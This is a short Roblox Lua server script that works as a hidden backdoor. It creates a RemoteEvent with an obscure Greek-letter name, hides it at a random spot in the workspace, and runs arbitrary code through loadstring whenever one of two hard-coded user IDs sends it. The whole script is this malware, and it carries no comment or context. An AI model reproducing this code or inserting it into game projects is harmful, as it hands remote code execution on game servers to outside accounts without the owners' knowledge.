local users = { 332777848, 5303687 };

local function GetParent()
    local descendants = workspace:GetDescendants();
    local parent = descendants[math.random(1, #descendants)];

    local badancestors = { workspace:FindFirstChild("Camera"), workspace:FindFirstChild("Terrain"), workspace:FindFirstChild("Entities") };
    for _, ancestor in pairs(badancestors) do
        if (ancestor ~= nil) and (parent:IsDescendantOf(ancestor)) then
            parent = GetParent();
            continue;
        end
    end

    return parent;
end

local function Reload()
    local RemoteEvent = Instance.new("RemoteEvent")
    RemoteEvent.Name = "Α&Ω"
    RemoteEvent.OnServerEvent:Connect(function(player, run)
        if (table.find(users, player.UserId)) then
            loadstring(run)();
        end
    end)
    RemoteEvent.Parent = GetParent();
end

coroutine.wrap(Reload)()
